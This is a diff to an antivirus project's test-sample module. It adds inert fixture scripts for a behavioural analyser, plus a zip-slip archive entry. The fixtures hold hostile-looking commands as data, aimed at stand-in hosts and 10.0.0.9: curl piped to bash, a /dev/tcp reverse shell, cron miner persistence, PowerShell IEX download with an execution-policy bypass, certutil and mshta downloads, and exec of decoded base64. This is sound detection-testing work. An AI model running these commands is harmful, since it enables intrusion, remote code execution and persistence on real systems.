@@ -447,3 +447,150 @@ def build_zip_sample() -> bytes:
         zf.writestr("notes.txt", "Just some harmless notes.\n")
         zf.writestr("../outside.txt", "I should never be written outside.\n")
     return buf.getvalue()
+
+
+# ---------------------------------------------------------------------------
+# Sample tree materialisation  (``antivirus samples``)
+# ---------------------------------------------------------------------------
+
+SAMPLE_TEXT_FILES: Dict[str, str] = {
+    "behavior/harmless-py.py": (
+        '"""A perfectly ordinary Python script (harmless demo)."""\n'
+        "\n"
+        "\n"
+        "def add(a, b):\n"
+        "    return a + b\n"
+        "\n"
+        "\n"
+        "def main():\n"
+        "    total = 0\n"
+        "    for i in range(1, 11):\n"
+        "        total += i\n"
+        '    print("sum of 1..10 =", add(total, 0))\n'
+        "    return 0\n"
+        "\n"
+        "\n"
+        'if __name__ == "__main__":\n'
+        "    raise SystemExit(main())\n"
+    ),
+    "behavior/harmless.sh": (
+        "#!/usr/bin/env bash\n"
+        "# A perfectly ordinary helper script (harmless demo).\n"
+        "set -euo pipefail\n"
+        "\n"
+        'greeting="${1:-world}"\n'
+        'echo "Hello, ${greeting}!"\n'
+        "date\n"
+    ),
+    "behavior/payload-py.py": (
+        '"""DEMO - inert sample for the behavioural analyser (never executed).\n'
+        "\n"
+        'Demonstrates the indicators the Python AST layer looks for.  The "payload"\n'
+        'is a harmless base64 string; nothing here is real malware.\n'
+        '"""\n'
+        "import base64\n"
+        "import os\n"
+        "import socket\n"
+        "import subprocess\n"
+        "\n"
+        'PAYLOAD_B64 = "aGVsbG8gd29ybGQgdGhpcyBpcyBub3QgYSByZWFsIHBheWxvYWQgaXQganVzdCBsb29zZXMgbGlrZSBvbmUgZm9yIHRoZSBEZW1vIG9mIHRoZSBiZWhhdmlvdXJhbCBhbmFseXplciBpbiB0aGUgQW50aVZpcmVzIHByb2plY3QgdG8gc2hvdyBvZmYgd2hhdCBhIG9idXNjdXJlIHB5cXVlIGxvb2tzIGxpa2Ugbm90aGluZw=="\n'
+        "\n"
+        "# Indicator: shell command execution (os.system)\n"
+        'os.system("uname -a")\n'
+        "\n"
+        "# Indicator: subprocess with shell=True\n"
+        'subprocess.check_output("id && whoami", shell=True)\n'
+        "\n"
+        "# Indicator: network connect to a hardcoded address\n"
+        "s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n"
+        's.connect(("10.0.0.9", 4444))\n'
+        "\n"
+        "# Indicators: dynamic code execution on decoded data\n"
+        "exec(base64.b64decode(PAYLOAD_B64))\n"
+    ),
+    "behavior/pipe-shell.sh": (
+        "#!/usr/bin/env bash\n"
+        "# DEMO - inert sample for the behavioural analyser (never executed).\n"
+        "# The hostnames below do not exist; nothing is ever run.\n"
+        "\n"
+        "# Indicator: download and pipe into a shell\n"
+        "curl -fsSL http://malware-sample.example.com/payload.sh | bash\n"
+        "\n"
+        "# Indicator: reverse shell via /dev/tcp\n"
+        "bash -i >& /dev/tcp/10.0.0.9/4444 0>&1\n"
+        "\n"
+        "# Indicator: persistence via cron\n"
+        'crontab -l | { cat; echo "* * * * * /tmp/miner"; } | crontab -\n'
+        "\n"
+        "# Indicator: crypto-mining pool endpoint (C2)\n"
+        "# stratum+tcp://pool.example.com:3333\n"
+    ),
+    "behavior/reverse-ps1.ps1": (
+        "# DEMO - inert sample for the behavioural analyser (never executed).\n"
+        "# The hostnames below do not exist; nothing is ever run.\n"
+        "\n"
+        "# Indicator: download and execute (IEX combined with a download call)\n"
+        "IEX (New-Object Net.WebClient).DownloadString('http://malware-sample.example.com/x.ps1')\n"
+        "\n"
+        "# Indicator: execution policy bypass\n"
+        '$psArgs = "-ExecutionPolicy Bypass -WindowStyle Hidden"\n'
+        "\n"
+        "# Indicator: raw socket usage (possible C2 channel)\n"
+        "$tcp = New-Object System.Net.Sockets.TcpClient('10.0.0.9', 4444)\n"
+    ),
+    "behavior/dropper.bat": (
+        "@echo off\n"
+        "rem DEMO - inert sample for the behavioural analyser (never executed).\n"
+        "rem The hostnames below do not exist; nothing is ever run.\n"
+        "\n"
+        "rem Indicator: certutil URL download (LOLBin)\n"
+        "certutil -urlcache -f -split http://malware-sample.example.com/d.exe %TEMP%\\d.exe\n"
+        "\n"
+        "rem Indicator: mshta remote script (LOLBin)\n"
+        "mshta http://malware-sample.example.com/x.hta\n"
+    ),
+}
+
+#: Top-level clean text sample.
+CLEAN_SAMPLE_TEXT = (
+    "This is a perfectly ordinary text file.\n"
+    "Nothing malicious in here, promise.\n"
+)
+
+
+def build_all_samples(root) -> list:
+    """Materialise the complete inert demo sample tree under *root*.
+
+    Mirrors the repository's ``samples/`` directory (EICAR test string,
+    clean text, behavioural scripts, code-less PE/ELF images, sneaky
+    archives). Returns the list of written paths.
+    """
+    from pathlib import Path
+
+    root = Path(root)
+    written: list = []
+
+    def write(rel: str, blob: bytes) -> None:
+        p = root / rel
+        p.parent.mkdir(parents=True, exist_ok=True)
+        p.write_bytes(blob)
+        written.append(p)
+
+    write("eicar-test.txt", EICAR_TEST_STRING.encode("ascii"))
+    write("clean.txt", CLEAN_SAMPLE_TEXT.encode("utf-8"))
+    for rel, text in sorted(SAMPLE_TEXT_FILES.items()):
+        write(rel, text.encode("utf-8"))
+    write("behavior/suspicious.exe", build_suspicious_pe())
+    write("behavior/clean.exe", build_clean_pe())
+    write("behavior/packed-upx.exe", build_packed_pe())
+    write("behavior/suspicious.elf", build_suspicious_elf())
+    write("behavior/clean.elf", build_clean_elf())
+    write("behavior/sneaky.zip", build_zip_sample())
+    write("behavior/sneaky.tar.gz", build_tar_sample())
+
+    # Ship the sample README too, when running from a full checkout.
+    repo_readme = Path(__file__).resolve().parent.parent / "samples" / \
+        "behavior" / "README.txt"
+    if repo_readme.exists():
+        write("behavior/README.txt", repo_readme.read_bytes())
+    return written
